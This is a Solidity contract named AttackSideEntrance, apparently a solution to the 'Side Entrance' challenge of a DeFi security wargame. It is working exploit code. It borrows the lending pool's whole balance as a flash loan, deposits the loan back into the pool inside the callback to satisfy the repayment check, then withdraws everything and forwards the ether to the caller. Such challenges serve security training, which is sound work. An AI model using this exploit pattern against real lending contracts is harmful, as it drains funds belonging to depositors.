// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import { SideEntranceLenderPool, IFlashLoanEtherReceiver } from "../../04_side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;

    receive() external payable { }

    function attack(SideEntranceLenderPool pool_) external payable {
        pool = pool_;

        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success,) = payable(msg.sender).call{ value: address(this).balance }("");
        require(success, "failed transfer");
    }

    function execute() external payable {
        pool.deposit{ value: msg.value }();
    }
}
